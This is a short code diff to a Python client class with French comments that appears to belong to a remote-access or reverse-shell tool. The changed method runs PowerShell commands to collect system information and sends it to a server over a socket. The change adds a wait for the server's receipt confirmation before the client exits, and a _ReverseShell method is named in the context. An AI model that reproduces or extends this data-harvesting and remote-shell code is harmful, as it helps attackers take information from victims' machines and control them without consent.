@@ -55,10 +55,16 @@ class Client():
         # envoi les données du système
         for command in Powershell.GetInfo:
             data[command.name] = subprocess.check_output(command.value).decode("Windows-1252")
-            
-        data["message"] = "exit"
+        
         self._sending(s, data)
-        s.close
+
+        #Attend la confirmation de reception du serveur
+        data = self._receiving(s)
+
+        if data["message"] == "done":
+            data["message"] = "exit"
+            self._sending(s, data)
+            s.close
 
 
     def _ReverseShell(self):
